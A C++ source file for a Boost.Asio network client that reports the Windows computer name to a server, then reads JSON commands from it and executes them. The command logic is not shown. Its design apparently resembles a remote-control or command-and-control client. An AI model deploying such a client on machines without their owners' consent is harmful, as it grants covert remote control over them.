#include "client.hpp"
#include "command.hpp"
#include <iostream>
#include <boost/system/error_code.hpp>
#include <windows.h>

#define MAX_READ_BUFFER 8192

client::client( boost::asio::io_service& io_service,
                const tcp::resolver::iterator& endpoint_iter ) 
: _io_service{ io_service }, _socket{ io_service } {
    do_connect( endpoint_iter );
}

void client::close() {
    _io_service.post( [ this ] {
        _socket.close();
    } );
}

void client::do_connect( const tcp::resolver::iterator& endpoint_iter ) {
    boost::asio::async_connect( _socket, endpoint_iter,
        [ this ] ( const boost::system::error_code& ec, 
                   tcp::resolver::iterator iter ) {
            if( !ec ) {

                DWORD len = MAX_COMPUTERNAME_LENGTH  + 1;
                std::string name;
                name.resize( len );

                GetComputerName( &*name.begin(), &len );
                boost::asio::streambuf buf;
                std::ostream os{ &buf };

                os << "Computer-Name: " << name;

                do_write( buf );
                buf.consume( buf.size() );

                do_read();
            } else {
                std::cerr << "Failed to connect to server!" << std::endl;
            }
        } );
}

void client::do_write( boost::asio::streambuf& buffer ) {
    boost::asio::async_write( _socket, buffer,
        [ this ] ( const boost::system::error_code& ec,
                   size_t bytes ) {
            if( ec ) {
                _socket.close();
            }
        } );
}

void client::do_read() {
    _socket.async_read_some( _buffer.prepare( MAX_READ_BUFFER ),
        [ this ] ( const boost::system::error_code& ec,
                   size_t bytes ) {
            if( !ec ) {

                _buffer.commit( bytes );

                std::string data;
                std::istream is{ &_buffer };
                std::getline( is, data );

                _buffer.consume( bytes );

                parse_command( data );

                do_read();
            } else {
                _socket.close();
            }
        } );
}

void client::parse_command( const std::string& json ) {
    command c;  
    c.load( json );
    c.execute_command();
}